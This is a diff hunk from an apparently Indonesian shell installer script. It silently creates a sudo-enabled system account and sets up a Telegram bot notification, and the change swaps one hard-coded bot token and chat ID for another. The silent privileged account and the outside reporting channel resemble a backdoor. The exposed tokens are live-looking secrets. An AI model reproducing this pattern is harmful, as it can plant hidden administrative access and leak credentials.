@@ -187,8 +187,8 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="6348824977"
-KEY="6854390843:AAHnygrqUOSq-5spVPBBrOvBMy4xcdUBPBU"
+CHATID="6523790410"
+KEY="6725540541:AAFzaiFK1y1b01zNnrayfHwa7GrRnkQ7ti0"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 TEXT="Installasi Script v1.0 By AtaaXD
